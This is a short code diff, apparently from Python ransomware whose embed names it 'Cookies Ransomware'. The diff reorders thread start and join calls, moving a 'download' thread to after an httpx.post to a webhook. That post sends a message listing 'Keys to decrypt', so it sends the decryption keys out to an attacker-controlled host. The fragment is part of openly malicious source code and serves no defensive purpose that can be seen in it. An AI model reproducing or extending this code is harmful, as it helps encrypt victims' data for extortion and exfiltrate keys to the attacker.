@@ -755,22 +755,22 @@ a.start()
 b.start()
 c.start()
 d.start()
-download.start()
 e.start()
 ff.start()
 g.start()
 h.start()
 
 
+
 a.join()
 b.join()
 c.join()
 d.join()
-download.join()
 e.join()
 ff.join()
 g.join()
 h.join()
+
 
 embed = {
     'username' : 'Cookies Ransomware',
@@ -804,5 +804,8 @@ Keys to decrypt:
 }
 
 httpx.post(webhook, json=embed)
+download.start()
 message.start()
+
+download.join()
 message.join()
